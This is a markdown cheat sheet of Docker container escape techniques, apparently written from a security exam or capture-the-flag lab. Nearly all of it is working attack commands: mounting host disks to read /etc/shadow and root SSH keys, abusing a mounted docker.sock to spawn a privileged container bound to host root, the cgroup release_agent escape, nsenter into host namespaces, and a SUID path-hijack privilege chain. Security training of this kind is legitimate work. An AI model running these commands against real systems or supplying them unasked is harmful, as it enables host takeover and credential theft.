# Docker Breakout Techniques

## Detection: Am I in a container?

```bash
ls -la /.dockerenv                    # exists = Docker
cat /proc/1/cgroup | grep -i docker   # cgroup contains "docker"
cat /proc/1/cgroup                    # "0::/" = cgroup v2 container
hostname                              # random hex = container
```

## Technique 1: Host Disk Mount (Privileged or Device Access)

**Condition:** Container can see host block devices (`fdisk -l` shows `/dev/sda`, `/dev/xvda`, `/dev/vda`, etc.)

```bash
# Identify host disk
fdisk -l 2>/dev/null | grep "^Disk /dev/"
# Look for: /dev/sda, /dev/xvda, /dev/vda (NOT /dev/loop*)

# Mount and access host filesystem
mkdir -p /mnt/host
mount /dev/xvda1 /mnt/host    # try partition first
mount /dev/xvda /mnt/host     # or whole disk if no partition table
mount /dev/sda1 /mnt/host     # common on non-AWS

# Read flags, secrets, SSH keys
cat /mnt/host/etc/shadow
cat /mnt/host/root/.ssh/id_rsa
cat /mnt/host/etc/bflag
```

**Proven pattern (SecOps exam, June 2026):** Container on 172.20.213.9:2222 had access to `/dev/xvda`. Mounted `/dev/xvda1` to `/mnt/host` and read `/mnt/host/etc/bflag`.

## Technique 2: Docker Socket Mount

**Condition:** `/var/run/docker.sock` is mounted in container

```bash
# Verify socket exists
ls -la /var/run/docker.sock

# List containers on host
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json

# Create privileged container with host root mounted
curl -s --unix-socket /var/run/docker.sock -X POST \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["/bin/sh","-c","cat /host/etc/shadow"],"HostConfig":{"Privileged":true,"Binds":["/:/host"]}}' \
  http://localhost/containers/create
```

## Technique 3: CAP_SYS_ADMIN + cgroup Escape

**Condition:** Container has CAP_SYS_ADMIN

```bash
# Check capabilities
cat /proc/self/status | grep CapEff
# 0000003fffffffff = fully privileged

# cgroup notify_on_release escape
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/w; echo 1 >$d/w/notify_on_release
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo $t/c >$d/release_agent
echo "#!/bin/sh" > /c
echo "cat /etc/shadow > $t/o" >> /c
chmod +x /c
sh -c "echo 0 >$d/w/cgroup.procs"; cat /o
```

## Technique 4: nsenter (hostPID required)

**Condition:** Container has `--pid=host`

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# Now in host namespace with full access
```

## Technique 5: Chroot into mounted host

```bash
# After mounting host disk to /mnt/host
chroot /mnt/host /bin/bash
# Now effectively on host with host's tools and configs
```

## Combining with Privilege Escalation

When container runs as non-root but has a privesc vector (SUID binary, sudo, etc.):
1. Escalate to root inside container first
2. Then attempt breakout techniques above

**SecOps exam chain:** bob (uid 1001) → SUID PATH hijack on `/usr/local/sbin/bypass` → root in container → mount `/dev/xvda1` → host filesystem access
